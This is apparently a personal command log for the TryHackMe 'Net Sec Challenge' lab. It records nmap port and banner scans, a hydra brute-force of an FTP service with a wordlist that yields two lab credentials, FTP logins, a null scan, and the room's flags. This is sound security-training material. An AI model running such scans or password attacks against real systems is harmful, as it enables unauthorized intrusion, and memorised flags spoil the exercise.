+++
title = "Net Sec Challenge"
+++
# https://tryhackme.com/room/netsecchallenge

```bash
=================================
10.201.22.156 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.201.22.156' >> ~/.zshrc && source ~/.zshrc

2025-09-12 18:01:28 -- sudo nmap -n -Pn -oA nmap_normal $TARGET
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8080/tcp open  http-proxy

2025-09-12 18:51:30 -- sudo nmap -n -Pn -T4 -p- $TARGET
10021/tcp open  unknown

2025-09-12 18:04:22 -- curl --include -o- $TARGET
// Server: lighttpd THM{web_server_25352}

2025-09-12 18:07:22 -- sudo nmap -n -Pn --script banner -p 22 $TARGET
// |_banner: SSH-2.0-OpenSSH_8.2p1 THM{946219583339}

2025-09-12 18:09:24 -- firefox http://10.201.22.156:8080
// challenge needs to scan stealthily

2025-09-12 18:53:00 -- sudo nmap -n -Pn -p10021 -A $TARGET
PORT      STATE SERVICE VERSION
10021/tcp open  ftp     vsftpd 3.0.5

2025-09-12 18:54:00 -- hydra -t 16 -L users.txt -P /usr/share/wordlists/rockyou.txt $TARGET -s 10021 ftp -V
// [10021][ftp] host: 10.201.22.156   login: eddie   password: jordan
// [10021][ftp] host: 10.201.22.156   login: quinn   password: andrea

2025-09-12 19:02:52 -- ftp ftp://eddie:jordan@$TARGET:10021
// nada
2025-09-12 19:02:55 -- ftp ftp://quinn:andrea@$TARGET:10021
// -rw-rw-r--    1 1002     1002           18 Sep 20  2021 ftp_flag.txt

2025-09-12 19:39:14 -- nmap -sN $TARGET
PORT     STATE         SERVICE
22/tcp   open|filtered ssh
80/tcp   open|filtered http
139/tcp  open|filtered netbios-ssn
445/tcp  open|filtered microsoft-ds
8080/tcp open|filtered http-proxy
//  Exercise Complete! Task answer: THM{f7443f99} 
```